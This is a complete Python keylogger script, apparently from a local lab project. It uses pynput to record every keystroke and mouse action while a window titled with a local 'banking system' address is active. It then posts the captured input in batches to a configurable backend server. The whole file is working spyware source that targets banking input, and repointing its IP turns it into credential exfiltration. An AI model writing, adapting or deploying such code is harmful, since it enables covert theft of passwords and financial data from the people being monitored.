import requests
import json
import threading
import subprocess
from pynput import keyboard, mouse

# Configurable server IP and port
IP_ADDRESS = '127.0.0.1'
PORT_NUMBER = '8000'

KEYSTROKE_URL = f'http://{IP_ADDRESS}:{PORT_NUMBER}/api/log-keystroke/'
MOUSE_URL = f'http://{IP_ADDRESS}:{PORT_NUMBER}/api/log-mouse-action/'

log_buffer = []
buffer_lock = threading.Lock()
batch_timer = None  # To avoid multiple overlapping timers


def is_banking_system_active():
    """Check if the active window is the banking system on 127.0.0.1:8000."""
    try:
        # Use xdotool to get the active window title
        window_title = subprocess.check_output(['xdotool', 'getactivewindow', 'getwindowname'], stderr=subprocess.DEVNULL)
        window_title = window_title.decode('utf-8').strip()

        # Check if the title contains "127.0.0.1:8000"
        return "127.0.0.1:8000" in window_title
    except Exception as e:
        print(f"Error detecting active window: {e}")
        return False


def on_press(key):
    """Handle keyboard key press events."""
    if not is_banking_system_active():
        return  # Ignore if not on the banking system

    try:
        log = {'key': key.char, 'action': 'key_press'}
    except AttributeError:
        key_mapping = {
            keyboard.Key.space: ' ',
            keyboard.Key.enter: '\n',
            keyboard.Key.tab: '\t'
        }
        log = {'key': key_mapping.get(key, str(key)), 'action': 'key_press'}

    with buffer_lock:
        log_buffer.append(log)
    schedule_batch_sending()


def on_release(key):
    """Handle keyboard key release events."""
    if not is_banking_system_active():
        return  # Ignore if not on the banking system

    log = {'key': str(key), 'action': 'key_release'}

    with buffer_lock:
        log_buffer.append(log)
    schedule_batch_sending()


def on_move(x, y):
    """Handle mouse movement events."""
    if not is_banking_system_active():
        return  # Ignore if not on the banking system

    log = {'action': 'move', 'coordinates': f"({x}, {y})"}

    send_to_backend(MOUSE_URL, log)


def on_click(x, y, button, pressed):
    """Handle mouse click events."""
    if not is_banking_system_active():
        return  # Ignore if not on the banking system

    action = 'pressed' if pressed else 'released'
    log = {'action': action, 'button': str(button), 'coordinates': f"({x}, {y})"}

    send_to_backend(MOUSE_URL, log)


def send_data_in_batches():
    """Send collected keystroke data in batches."""
    global log_buffer
    with buffer_lock:
        if log_buffer:
            payload = {'data': log_buffer}
            send_to_backend(KEYSTROKE_URL, payload)
            log_buffer = []


def send_to_backend(url, log):
    """Send logged data to the Django backend."""
    try:
        response = requests.post(url, headers={'Content-Type': 'application/json'}, json=log)
        if response.status_code in [200, 201]:
            print(f"Data successfully sent to {url}")
        else:
            print(f"Failed to send data: {response.status_code} - {response.text}")
    except requests.exceptions.RequestException as e:
        print(f"Error sending data: {e}")


def start_listeners():
    """Start keyboard and mouse listeners."""
    keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    mouse_listener = mouse.Listener(on_move=on_move, on_click=on_click)

    keyboard_listener.start()
    mouse_listener.start()

    keyboard_listener.join()
    mouse_listener.join()


if __name__ == "__main__":
    print("Custom keylogger script running...")
    start_listeners()

